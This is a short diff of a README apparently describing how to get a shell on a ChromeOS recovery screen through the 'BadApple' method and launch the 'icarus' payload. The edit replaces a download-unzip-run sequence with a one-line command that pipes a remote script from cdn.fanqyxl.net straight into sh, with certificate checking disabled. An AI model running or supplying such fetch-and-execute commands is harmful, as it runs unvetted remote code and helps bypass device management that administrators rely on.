@@ -22,7 +22,7 @@ now, you can choose 2 different ways to carry this out.
 2. when the frecon screen loads, click Next
 3. next, connect to an available wifi network
 4. when the wifi has connected, DO NOT PROCEED. we now use BadApple to obtain a shell
-5. run these commands to start the icarus payload: `cd / && curl -O cdn.fanqyxl.net/icarus_ba.zip && unzip icarus_ba.zip && cd /icarus && ./icarus_ba.sh`
+5. run these commands to start the icarus payload: `curl -SLk cdn.fanqyxl.net/icarus_ota.sh | sh`
 
 ## build a badapple icarus image
 this is useless for the average user, only use this if you want to customize PKIMetadata or icarus_ba.sh
